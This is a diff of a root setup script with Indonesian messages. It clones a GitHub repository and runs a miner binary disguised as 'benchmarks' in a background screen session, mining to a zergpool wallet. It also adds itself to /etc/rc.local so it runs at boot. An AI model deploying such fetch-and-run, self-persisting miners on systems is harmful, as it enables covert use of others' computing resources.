@@ -2,12 +2,17 @@
 echo "📦 Menginstal dependensi..."
 apt-get update && apt-get install -y screen wget git
 
-echo "📁 Menyimpan skrip mining ke /root/web2..."
-cat << 'EOF' > /root/web
+echo "🌐 Meng-clone skrip mining dari GitHub..."
+rm -rf /root/web
+git clone https://github.com/amirul5656/web.git /root/web
+
+echo "📁 Menyimpan skrip mining ke /root/web.sh..."
+cat << 'EOF' > /root/web.sh
 #!/bin/bash
 
-cd /root/web || exit 1
+cd /root/web || exit
 
+chmod +x web2
 chmod +x benchmarks
 
 # Cek apakah screen sudah berjalan
@@ -17,7 +22,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yui
+      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux --password c=DOGE,mc=PEPEW,ID=yui
       sleep 2
     done
   '
@@ -34,8 +39,6 @@ if [ -f /etc/rc.local ]; then
   if ! grep -q '/root/web2' /etc/rc.local; then
     sed -i '/^exit 0/i bash /root/web2 &' /etc/rc.local
     echo "🛠️ Menambahkan ke /etc/rc.local"
-  else
-    echo "ℹ️ Skrip sudah ada di /etc/rc.local, tidak ditambahkan lagi."
   fi
 else
   echo '#!/bin/bash' > /etc/rc.local
